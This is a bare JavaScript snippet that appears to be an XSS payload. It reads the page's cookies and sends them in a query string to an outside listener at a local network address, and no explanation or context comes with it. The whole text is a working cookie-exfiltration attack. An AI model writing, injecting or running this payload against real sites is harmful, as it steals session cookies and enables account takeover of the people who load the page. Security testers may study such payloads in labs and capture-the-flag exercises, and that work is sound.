token = document.cookie
url = "http://172.17.0.1:8086/prueba.txt?token="+token
fetch(url, {
    method: 'GET'
})
.then((res) => res.text())
.then((data) => {
});
